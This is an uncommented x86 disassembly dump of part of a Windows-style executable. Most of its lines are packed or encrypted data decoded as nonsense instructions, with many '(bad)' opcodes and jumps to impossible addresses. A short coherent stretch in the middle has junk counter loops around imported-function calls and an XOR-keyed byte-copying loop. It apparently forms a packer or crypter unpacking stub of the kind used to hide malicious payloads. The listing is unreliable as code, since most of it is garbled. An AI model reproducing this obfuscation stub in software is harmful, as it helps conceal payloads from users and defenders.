  40f2b3:	sbb    bl,BYTE PTR [ebx]
  40f2b5:	lock mov WORD PTR [eax],ss
  40f2b8:	and    esp,DWORD PTR [ebx+0x33]
  40f2bb:	lods   al,BYTE PTR ds:[esi]
  40f2bc:	(bad)  
  40f2bd:	aas    
  40f2be:	fcom   QWORD PTR [eax]
  40f2c0:	pop    ebp
  40f2c1:	pop    ss
  40f2c2:	and    al,0x51
  40f2c4:	cmp    DWORD PTR [ecx+eiz*8-0x1],edi
  40f2c8:	push   esp
  40f2c9:	dec    edi
  40f2ca:	jmp    0x40f334
  40f2cc:	add    BYTE PTR ds:0x4accccdb,ch
  40f2d2:	add    eax,0xd96ab9d1
  40f2d7:	mov    bh,0x17
  40f2d9:	pop    esp
  40f2da:	mov    edi,0xdc352938
  40f2df:	sub    DWORD PTR [ecx+0x63],ecx
  40f2e2:	clc    
  40f2e3:	pop    ss
  40f2e4:	push   esp
  40f2e5:	xchg   ecx,eax
  40f2e6:	(bad)  
  40f2e8:	mov    ch,0xd2
  40f2ea:	mov    esp,0xdbd1bd50
  40f2ef:	adc    eax,0x285d398c
  40f2f4:	out    0xb0,al
  40f2f6:	jmp    0xfad615ce
  40f2fb:	jo     0x40f2c1
  40f2fd:	stos   DWORD PTR es:[edi],eax
  40f2fe:	neg    BYTE PTR [eax-0x3bce1c4a]
  40f304:	fs es sub dl,bl
  40f308:	lds    edx,FWORD PTR [esi-0x23]
  40f30b:	mov    bh,0x48
  40f30d:	stos   DWORD PTR es:[edi],eax
  40f30e:	inc    ebx
  40f30f:	jne    0x40f341
  40f311:	jg     0x40f2c6
  40f313:	(bad)  
  40f314:	nop
  40f315:	data16 xchg cl,bh
  40f318:	cli    
  40f319:	inc    esp
  40f31a:	cld    
  40f31b:	jnp    0x40f324
  40f31d:	push   cx
  40f31f:	retf   
  40f320:	adc    bl,BYTE PTR [ebx]
  40f322:	out    0x82,al
  40f324:	test   eax,0x57681aa0
  40f329:	sub    ebx,esi
  40f32b:	xchg   ecx,eax
  40f32c:	repnz cmp DWORD PTR [edi+0x2b],ecx
  40f330:	fisttp QWORD PTR [eax+0x66fe43e]
  40f336:	pop    esp
  40f337:	cmp    edi,DWORD PTR [edi-0x4980840e]
  40f33d:	push   0x5a
  40f33f:	xor    BYTE PTR [esi],dh
  40f341:	push   ebx
  40f342:	xchg   DWORD PTR [eax],ebx
  40f344:	sahf   
  40f345:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f347:	mov    al,0x97
  40f349:	inc    esp
  40f34a:	xor    BYTE PTR [edi],al
  40f34c:	cmc    
  40f34d:	imul   esi,DWORD PTR [esi-0x64700446],0x69434143
  40f357:	in     al,dx
  40f358:	push   0x9e7d8edd
  40f35d:	in     eax,0x2e
  40f35f:	pusha  
  40f360:	push   ecx
  40f361:	inc    esi
  40f362:	jp     0x40f37f
  40f364:	mov    gs,WORD PTR [edi+0x1d]
  40f367:	(bad)  
  40f368:	xchg   esi,eax
  40f369:	pusha  
  40f36a:	ret    0x8dae
  40f36d:	sub    edx,ecx
  40f36f:	dec    edi
  40f370:	fcmovnbe st,st(7)
  40f372:	call   0x6ac869ff
  40f377:	(bad)  
  40f378:	scas   eax,DWORD PTR es:[edi]
  40f379:	fstp   QWORD PTR [eax-0x440749a9]
  40f37f:	lds    eax,FWORD PTR [ebx-0x7ace4748]
  40f385:	pushf  
  40f386:	clc    
  40f387:	and    DWORD PTR ds:0x4338a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x14b4df39]
  40f540:	add    edx,esp
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	sub    eax,0xd436d198
  40f54e:	inc    ebx
  40f54f:	inc    edx
  40f550:	ins    BYTE PTR es:[edi],dx
  40f551:	inc    eax
  40f552:	mov    ch,0x97
  40f554:	ret    0x78de
  40f557:	sar    DWORD PTR [eax-0x4bc9bd92],0xbe
  40f55e:	pop    ecx
  40f55f:	scas   eax,DWORD PTR es:[edi]
  40f560:	pusha  
  40f561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f562:	mov    ds:0x3a7320e8,al
  40f567:	sbb    dh,BYTE PTR [ebx+edx*4+0x6363f1d2]
  40f56e:	lock lds ebp,FWORD PTR [ebx+ebx*2+0x26]
  40f573:	lahf   
  40f574:	jns    0x40f589
  40f576:	lods   eax,DWORD PTR ds:[esi]
  40f577:	loopne 0x40f514
  40f579:	push   ebx
  40f57a:	mov    esp,0x8c6b3b7f
  40f57f:	lds    edi,FWORD PTR [eax-0x27a49a71]
  40f585:	imul   ebp,DWORD PTR [edi-0x3f],0x5b
  40f589:	js     0x40f5be
  40f58b:	mov    al,0xc7
  40f58d:	cld    
  40f58e:	or     cl,dh
  40f590:	add    eax,0xfc0ff75
  40f595:	pop    ds
  40f596:	sbb    BYTE PTR [ebp-0x6e],al
  40f599:	cld    
  40f59a:	and    DWORD PTR [edx-0x7b480332],esp
  40f5a0:	sti    
  40f5a1:	mov    ch,0xfa
  40f5a3:	dec    ebx
  40f5a4:	sti    
  40f5a5:	adc    al,0xba
  40f5a7:	inc    eax
  40f5a8:	dec    ecx
  40f5a9:	inc    esi
  40f5aa:	xor    bh,cl
  40f5ac:	mov    ds:0xaefdee0,eax
  40f5b1:	sbb    bl,BYTE PTR [ebx+0x50269158]
  40f5b7:	jo     0x40f54e
  40f5b9:	int    0xe7
  40f5bb:	and    al,0x47
  40f5bd:	xchg   edx,eax
  40f5be:	sbb    eax,0xbeeea9c2
  40f5c3:	jecxz  0x40f5a0
  40f5c5:	mov    ebp,0xf36e3d30
  40f5ca:	fisub  DWORD PTR [ecx+0x2f90e7c3]
  40f5d0:	and    BYTE PTR [edi-0x725953af],0xd2
  40f5d7:	cs jno 0x40f626
  40f5da:	xor    cl,BYTE PTR [ebp-0x9]
  40f5dd:	in     eax,dx
  40f5de:	mov    al,ds:0x69b33197
  40f5e3:	adc    DWORD PTR ss:[ecx+0x2],0x3ebb1d58
  40f5eb:	sbb    DWORD PTR [ecx+eiz*8],ecx
  40f5ee:	mov    dl,0x4
  40f5f0:	or     al,0xaa
  40f5f2:	add    bh,al
  40f5f4:	loope  0x40f672
  40f5f6:	sub    DWORD PTR [ecx+eax*4+0x1d],esp
  40f5fa:	jmp    0xc103:0x5090d81f
  40f601:	(bad)  
  40f602:	push   eax
  40f603:	rcr    esp,1
  40f605:	dec    edx
  40f606:	and    eax,0x81ffe327
  40f60b:	cs (bad) 
  40f60d:	pushf  
  40f60e:	ror    dh,1
  40f610:	arpl   WORD PTR [ebx],ax
  40f612:	xchg   ebp,eax
  40f613:	(bad)
  40f616:	adc    DWORD PTR [eax+0x25],esi
  40f619:	sub    DWORD PTR [esi+ebx*4+0x6ade603f],0x86496ab1
  40f624:	xchg   ebx,eax
  40f625:	loop   0x40f5b2
  40f627:	cmp    al,0xec
  40f629:	mov    edx,0x372922c
  40f62e:	stos   BYTE PTR es:[edi],al
  40f62f:	cmc    
  40f630:	adc    DWORD PTR fs:[esi+0x34],0xb8cd632c
  40f638:	mov    ecx,0xe399e30
  40f63d:	xchg   ebx,eax
  40f63e:	fbld   TBYTE PTR [edx+ecx*8+0x5e]
  40f642:	sti    
  40f643:	fst    st(4)
  40f645:	aas    
  40f646:	daa    
  40f647:	mov    ?,WORD PTR [edx-0x21]
  40f64a:	sub    ax,0xb209
  40f64e:	push   ss
  40f64f:	ret    0x2d9f
  40f652:	adc    ch,BYTE PTR [ebp+0x4d736eef]
  40f658:	repnz cdq 
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	xchg   edx,eax
  40f65c:	add    ecx,DWORD PTR [eax+0xa]
  40f65f:	(bad)  [eax+0x27]
  40f662:	mov    eax,ds:0x5c0c1bb4
  40f667:	ss lahf 
  40f669:	pop    ebx
  40f66a:	push   eax
  40f66b:	mov    edx,DWORD PTR [edi-0x59626049]
  40f671:	mov    dh,0xe1
  40f673:	cmp    eax,0x9916c3b8
  40f678:	in     eax,0x6e
  40f67a:	cs jnp 0x40f6c2
  40f67d:	push   es
  40f67e:	jbe    0x40f6f1
  40f680:	mov    ecx,0x89901a19
  40f685:	xor    esi,DWORD PTR [edx-0x325c87d9]
  40f68b:	(bad)  
  40f68c:	out    0x50,eax
  40f68e:	jb     0x40f62d
  40f690:	xchg   edx,eax
  40f691:	cli    
  40f692:	cmp    al,0x72
  40f694:	shr    BYTE PTR [edx-0x1e],0x9f
  40f698:	int3   
  40f699:	fild   QWORD PTR [ebx+0x22]
  40f69c:	psrld  mm3,QWORD PTR [esi]
  40f69f:	jmp    0xc056db19
  40f6a4:	outs   dx,BYTE PTR ds:[esi]
  40f6a5:	mov    al,ds:0x95532498
  40f6aa:	sub    al,0x59
  40f6ac:	mov    al,ds:0xaaf21a97
  40f6b1:	jns    0x40f6c7
  40f6b3:	in     eax,0xb8
  40f6b5:	lahf   
  40f6b6:	pop    ds
  40f6b7:	add    al,0xa6
  40f6b9:	in     eax,0xdc
  40f6bb:	test   al,0x61
  40f6bd:	add    al,0x90
  40f6bf:	or     al,BYTE PTR [edx-0x7c]
  40f6c2:	push   edi
  40f6c3:	or     DWORD PTR [edx],edi
  40f6c5:	repz xchg esp,eax
  40f6c7:	ret    
  40f6c8:	jg     0x40f664
  40f6ca:	sar    DWORD PTR [ebx+0x43024b15],cl
  40f6d0:	or     eax,DWORD PTR [edi+esi*2-0x5f]
  40f6d4:	jo     0x40f6d3
  40f6d6:	jge    0x40f6fe
  40f6d8:	std    
  40f6d9:	mov    eax,0xf41260ad
  40f6de:	inc    esi
  40f6df:	daa    
  40f6e0:	cmp    BYTE PTR [esi-0x61],al
  40f6e3:	test   dl,0xf5
  40f6e6:	fnstcw WORD PTR [edi]
  40f6e8:	rcr    ebp,1
  40f6ea:	popf   
  40f6eb:	inc    ebp
  40f6ec:	(bad)  
  40f6ed:	cld    
  40f6ee:	lods   eax,DWORD PTR ds:[esi]
  40f6ef:	fld    QWORD PTR [ebx]
  40f6f1:	adc    edi,DWORD PTR [eax]
  40f6f3:	jmp    0xefbb7761
  40f6f8:	std    
  40f6f9:	sti    
  40f6fa:	sti    
  40f6fb:	(bad)
  40f6fe:	jmp    0x40f6d0
  40f700:	ss xchg ebx,eax
  40f702:	cmp    BYTE PTR [ecx+0x6f],dh
  40f705:	fld    TBYTE PTR [edx+0x5457e120]
  40f70b:	add    ebx,0xffffffa3
  40f70e:	jae    0x40f6a6
  40f710:	lfs    esi,FWORD PTR [ebp-0x66]
  40f714:	sbb    DWORD PTR [edx],0xee3db7ed
  40f71a:	dec    edi
  40f71b:	and    edi,edi
  40f71d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71e:	push   cs
  40f71f:	inc    ebx
  40f720:	xchg   bh,ah
  40f722:	inc    esi
  40f723:	inc    edi
  40f724:	gs xor eax,0xa502c298
  40f72a:	ins    DWORD PTR es:[edi],dx
  40f72b:	loop   0x40f6cf
  40f72d:	cdq    
  40f72e:	lahf   
  40f72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f730:	loope  0x40f754
  40f732:	(bad)  
  40f733:	pop    ebx
  40f734:	xchg   eax,ecx
  40f736:	shr    DWORD PTR [ecx],0xc9
  40f739:	(bad)  
  40f73a:	cmp    eax,0x746d3e19
  40f73f:	popa   
  40f740:	mov    ah,0x8f
  40f742:	sar    DWORD PTR [edi+0x53],cl
  40f745:	xor    BYTE PTR [ebx],dl
  40f747:	inc    esi
  40f748:	xor    bl,BYTE PTR [eax+0x4e]
  40f74b:	es cmp al,0xbb
  40f74e:	pop    si
  40f750:	stc    
  40f751:	dec    edx
  40f752:	test   DWORD PTR [edx+0x8d352d1],esi
  40f758:	inc    esp
  40f759:	inc    esi
  40f75a:	add    BYTE PTR [esi],bh
  40f75c:	add    BYTE PTR [edi+0x6],ah
  40f75f:	xchg   edx,eax
  40f760:	stos   BYTE PTR es:[edi],al
  40f761:	dec    edx
  40f762:	push   ss
  40f763:	ja     0x40f785
  40f765:	sbb    eax,0x2c431934
  40f76a:	loop   0x40f737
  40f76c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f76d:	mov    al,ds:0x2274a3a7
  40f772:	ins    BYTE PTR es:[edi],dx
  40f773:	sbb    BYTE PTR ds:0xf6972fb0,cl
  40f779:	sti    
  40f77a:	push   edi
  40f77b:	addr16 inc esp
  40f77d:	mov    BYTE PTR [edx+0xd],dh
  40f780:	das    
  40f781:	jge    0x40f7b7
  40f783:	ror    BYTE PTR [esi],0x23
  40f786:	mov    ch,dh
  40f788:	ret    
  40f789:	icebp  
  40f78a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78b:	cld    
  40f78c:	mov    ebp,0x9239288e
  40f791:	mov    es,WORD PTR [edx+0x6f]
  40f794:	aaa    
  40f795:	test   eax,0x24b7d39d
  40f79a:	mov    ds:0x2357c1f9,al
  40f79f:	cmp    al,bl
  40f7a1:	(bad)  
  40f7a2:	mov    ah,0x88
  40f7a4:	xor    esp,DWORD PTR [edx-0x2fe7a70]
  40f7aa:	push   cs
  40f7ab:	mov    edi,0x20b3ebd3
  40f7b0:	pop    ss
  40f7b1:	fsubr  st,st(6)
  40f7b3:	adc    bl,al
  40f7b5:	jno    0x40f742
  40f7b7:	adc    eax,0x7a3925a9
  40f7bc:	mov    ds:0x876a1c9,al
  40f7c1:	dec    ecx
  40f7c2:	adc    al,0x43
  40f7c4:	xor    ecx,DWORD PTR [ebx]
  40f7c6:	aam    0x17
  40f7c8:	test   DWORD PTR [esi+edi*4-0x16],0x28cd9037
  40f7d0:	aad    0x22
  40f7d2:	cmovnp ebx,eax
  40f7d5:	mov    dl,ch
  40f7d7:	adc    ebp,DWORD PTR [eax-0x4e]
  40f7da:	push   eax
  40f7db:	jbe    0x40f7a4
  40f7dd:	(bad)  
  40f7df:	(bad)  
  40f7e0:	xor    DWORD PTR [eax-0x9],edx
  40f7e3:	out    0xb9,al
  40f7e5:	scas   eax,DWORD PTR es:[edi]
  40f7e6:	fild   WORD PTR [edx+0x2da80caa]
  40f7ec:	test   bh,ah
  40f7ee:	icebp  
  40f7ef:	out    0x76,eax
  40f7f1:	or     BYTE PTR [ecx-0x7ccd6865],al
  40f7f7:	sub    eax,0xf771eb0c
  40f7fc:	push   ds
  40f7fd:	xor    bh,BYTE PTR [edx+0x29]
  40f800:	(bad)  [ebx+ecx*2-0x4e96b977]
  40f807:	popf   
  40f808:	or     BYTE PTR [edx+0x33],bl
  40f80b:	jno    0x40f82d
  40f80d:	inc    esp
  40f80e:	mov    edi,0x2825724d
  40f813:	inc    BYTE PTR [ecx]
  40f815:	rcr    BYTE PTR [esi-0x5c],0xec
  40f819:	ror    eax,cl
  40f81b:	mov    ch,0xc5
  40f81d:	inc    edx
  40f81e:	jecxz  0x40f821
  40f820:	dec    esi
  40f821:	pop    ss
  40f822:	rcl    DWORD PTR [edx+ebx*2],cl
  40f825:	imul   edx,edi,0xfffffff1
  40f828:	dec    esi
  40f829:	mov    eax,ds:0xb38a7c7c
  40f82e:	ja     0x40f7d1
  40f830:	cmp    BYTE PTR [edx+edx*2-0x28ea6b2],al
  40f837:	add    al,0xbb
  40f839:	push   ds
  40f83a:	sub    DWORD PTR [ecx+0x66],0x8fa1215f
  40f841:	sub    edi,edi
  40f843:	rol    BYTE PTR [esi],1
  40f845:	mov    al,ds:0x4d9de5c3
  40f84a:	sbb    DWORD PTR [ebx],esi
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xc925b53f
  40f897:	adc    dl,0xab
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	test   DWORD PTR [ebx],0xa02c18dc
  40f8a6:	sub    eax,DWORD PTR [ecx+0x14]
  40f8a9:	imul   edx,edx,0x93539f2
  40f8af:	sub    ecx,DWORD PTR [ebp+0x1b]
  40f8b2:	lock mov al,ds:0xb951885a
  40f8b8:	ins    DWORD PTR es:[edi],dx
  40f8b9:	sar    dl,0x6d
  40f8bc:	ins    DWORD PTR es:[edi],dx
  40f8bd:	mov    al,ds:0xf85fe6b0
  40f8c2:	xor    eax,0x57a6214
  40f8c7:	dec    edx
  40f8c8:	or     ecx,DWORD PTR [ebx+0x11ee1971]
  40f8ce:	test   eax,0x4ed6e030
  40f8d3:	scas   al,BYTE PTR es:[edi]
  40f8d4:	jmp    0x63b27846
  40f8d9:	pop    es
  40f8da:	xchg   esp,eax
  40f8db:	and    BYTE PTR [ecx+0x7f949a76],bh
  40f8e1:	inc    esi
  40f8e2:	mov    dl,0xb2
  40f8e4:	enter  0x4d6f,0x60
  40f8e8:	cmc    
  40f8e9:	sbb    DWORD PTR [eax+0x40a6e931],eax
  40f8ef:	popa   
  40f8f0:	out    dx,eax
  40f8f1:	inc    esp
  40f8f2:	icebp  
  40f8f3:	popf   
  40f8f4:	pop    edi
  40f8f5:	xchg   ecx,eax
  40f8f6:	xchg   esi,eax
  40f8f7:	sbb    ebx,esi
  40f8f9:	inc    esp
  40f8fa:	push   ebp
  40f8fb:	and    DWORD PTR [edx+0x48ed395a],edi
  40f901:	fcom   QWORD PTR [ebp+0x8]
  40f904:	push   es
  40f905:	sahf   
  40f906:	sbb    edi,DWORD PTR [edi]
  40f908:	xchg   DWORD PTR [edi],eax
  40f90a:	push   cs
  40f90b:	rcl    BYTE PTR [esp+edi*2+0x74],0x6b
  40f910:	add    BYTE PTR [ebp+0x6d0ccce4],0xf
  40f917:	out    dx,al
  40f918:	mov    WORD PTR [edx-0x382f2150],es
  40f91e:	je     0x40f8f5
  40f920:	sub    edi,eax
  40f922:	adc    al,0x5b
  40f924:	push   ebp
  40f925:	jne    0x40f983
  40f927:	xchg   ebx,eax
  40f928:	inc    ecx
  40f929:	fiadd  DWORD PTR [eax+0x70]
  40f92c:	outs   dx,DWORD PTR ds:[esi]
  40f92d:	pushf  
  40f92e:	out    0x72,al
  40f930:	sub    BYTE PTR [eax-0x68],dl
  40f933:	jle    0x40f8d9
  40f935:	jno    0x40f994
  40f937:	int3   
  40f938:	add    bl,dl
  40f93a:	sahf   
  40f93b:	test   esp,esi
  40f93d:	cmp    ecx,0xffffffa1
  40f940:	xchg   edx,eax
  40f941:	push   ebx
  40f942:	fadd   QWORD PTR [edi+0x751dbc51]
  40f948:	(bad)  [esi]
  40f94a:	ret    0x4929
  40f94d:	mov    al,0x14
  40f94f:	jb     0x40f8f1
  40f951:	pop    ebp
  40f952:	popa   
  40f953:	or     BYTE PTR [eax+0x2c4924a6],bl
  40f959:	cmp    DWORD PTR [ebp+0xc5dfd6f],0xffffff8b
  40f960:	inc    esi
  40f961:	push   ecx
  40f962:	cmp    eax,0xdeba84f3
  40f967:	js     0x40f901
  40f969:	push   esi
  40f96a:	inc    eax
  40f96b:	jb     0x40f904
  40f96d:	cmp    al,BYTE PTR [eax]
  40f96f:	shl    BYTE PTR [ecx],0xa4
  40f972:	sbb    DWORD PTR [edi],edx
  40f974:	mov    ds:0x9a108de1,eax
  40f979:	ret    0x266b
  40f97c:	rcr    DWORD PTR ds:0x9daf428,0xfb
  40f983:	pushf  
  40f984:	pushf  
  40f985:	adc    bl,0xc4
  40f988:	push   edx
  40f989:	xlat   BYTE PTR ds:[ebx]
  40f98a:	jnp    0x40f976
  40f98c:	push   cs
  40f98d:	pop    edx
  40f98e:	frstor ss:[ebx+0x1d]
  40f992:	test   BYTE PTR [edi],bh
  40f994:	int    0x56
  40f996:	cmp    BYTE PTR [edx-0x1a4c7b72],0x32
  40f99d:	mov    esi,0x47eaf7fc
  40f9a2:	(bad)  
  40f9a3:	(bad)  
  40f9a4:	lahf   
  40f9a5:	mov    dl,0x54
  40f9a7:	repnz mov edi,0xf81f4f97
  40f9ad:	jle    0x40f99d
  40f9af:	xchg   esi,eax
  40f9b0:	jge    0x40f9d1
  40f9b2:	stc    
  40f9b3:	rol    DWORD PTR [edi],0xf3
  40f9b6:	in     eax,0xca
  40f9b8:	push   ss
  40f9b9:	push   ebp
  40f9ba:	jno    0x40f944
  40f9bc:	fcom   DWORD PTR [eax+0x3cfeb9ef]
  40f9c2:	mov    BYTE PTR [ebx-0x32],dl
  40f9c5:	cmp    ebp,DWORD PTR [edi-0x8]
  40f9c8:	fst    DWORD PTR [ebx]
  40f9ca:	sbb    edi,DWORD PTR [ebx+0x2ab7a2aa]
  40f9d0:	leave  
  40f9d1:	cmp    ecx,ebp
  40f9d3:	inc    ebp
  40f9d4:	sbb    BYTE PTR [esi],bh
  40f9d6:	mov    ebp,0xd081203
  40f9db:	repnz icebp 
  40f9dd:	jne    0x40f9fd
  40f9df:	mov    al,0x9f
  40f9e1:	pusha  
  40f9e2:	pop    eax
  40f9e3:	sbb    eax,0xacbc3812
  40f9e8:	add    al,0x97
  40f9ea:	stos   BYTE PTR es:[edi],al
  40f9eb:	jnp    0x40fa6c
  40f9ed:	addr16 pop es
  40f9ef:	add    esi,DWORD PTR [ebp+0x49]
  40f9f2:	popf   
  40f9f3:	sbb    bh,dl
  40f9f5:	dec    ebx
  40f9f6:	sub    esp,esp
  40f9f8:	add    DWORD PTR [ebp-0x758af5d1],eax
  40f9fe:	and    DWORD PTR [eax+eax*8-0x3d],edx
  40fa02:	mov    edx,0x18f25fd5
  40fa07:	repz dec esi
  40fa09:	mov    bl,BYTE PTR [ebx+0x2d455b22]
  40fa0f:	imul   esp,ebp,0xedac05fd
  40fa15:	jno    0x40f9a9
  40fa17:	mov    BYTE PTR [edx-0x6d],cl
  40fa1a:	jmp    0x40f9c1
  40fa1c:	dec    ebp
  40fa1d:	aaa    
  40fa1e:	loopne 0x40f9cc
  40fa20:	ret    0xc494
  40fa23:	int    0xb9
  40fa25:	enter  0x4347,0x9b
  40fa29:	jg     0x40fa46
  40fa2b:	mov    edx,0xc064fb70
  40fa30:	mov    bh,0x47
  40fa32:	inc    edi
  40fa33:	cmp    al,0x79
  40fa35:	sar    DWORD PTR [ecx],cl
  40fa37:	jae    0x40fa28
  40fa39:	std    
  40fa3a:	mov    cl,0xc0
  40fa3c:	pop    es
  40fa3d:	dec    esi
  40fa3e:	loop   0x40f9f4
  40fa40:	lods   eax,DWORD PTR ds:[esi]
  40fa41:	in     al,0xd0
  40fa43:	sti    
  40fa44:	cmp    esp,DWORD PTR [edx+0x41585a44]
  40fa4a:	push   eax
  40fa4b:	pop    edx
  40fa4c:	mov    cl,BYTE PTR [eax+0x128f3b64]
  40fa52:	(bad)  
  40fa53:	dec    edi
  40fa54:	jb     0x40fa9f
  40fa56:	fcmovnu st,st(1)
  40fa58:	jg     0x40fa36
  40fa5a:	pop    ecx
  40fa5b:	pop    ebp
  40fa5c:	out    dx,al
  40fa5d:	jo     0x40fa46
  40fa5f:	aas    
  40fa60:	into   
  40fa61:	dec    esp
  40fa62:	or     BYTE PTR [eax-0x44],dl
  40fa65:	mov    bl,0xb7
  40fa67:	stos   BYTE PTR es:[edi],al
  40fa68:	jmp    0x2602da89
  40fa6d:	xor    dh,BYTE PTR [edi-0x9]
  40fa70:	jbe    0x40facc
  40fa72:	popa   
  40fa73:	adc    al,0x68
  40fa75:	cmp    DWORD PTR [ecx-0x3],edi
  40fa78:	xchg   edi,eax
  40fa79:	sub    al,0x6f
  40fa7b:	push   esi
  40fa7c:	stos   DWORD PTR es:[edi],eax
  40fa7d:	sbb    edx,DWORD PTR [edx-0x2d8f8c1]
  40fa83:	xchg   DWORD PTR [esi-0x27fefcf2],ebp
  40fa89:	hlt    
  40fa8a:	scas   al,BYTE PTR es:[edi]
  40fa8b:	call   0xa9bc:0x4d3c44ec
  40fa92:	or     dl,0x5b
  40fa95:	ret    
  40fa96:	fmul   st(2),st
  40fa98:	aaa    
  40fa99:	pop    ebx
  40fa9a:	add    bl,BYTE PTR [esi+0x73]
  40fa9d:	inc    ebx
  40fa9e:	push   ecx
  40fa9f:	loopne 0x40fac7
  40faa1:	fdiv   DWORD PTR [edx]
  40faa3:	rcl    bh,cl
  40faa5:	push   ss
  40faa6:	mov    al,BYTE PTR [ecx+edx*4+0x76]
  40faaa:	or     eax,DWORD PTR [edi+0x1b]
  40faad:	inc    esp
  40faae:	fwait
  40faaf:	in     eax,dx
  40fab0:	pop    es
  40fab1:	xlat   BYTE PTR ds:[ebx]
  40fab2:	fidiv  DWORD PTR [esi-0x72]
  40fab5:	test   al,0x12
  40fab7:	cwde   
  40fab8:	and    eax,0x7e0a2d70
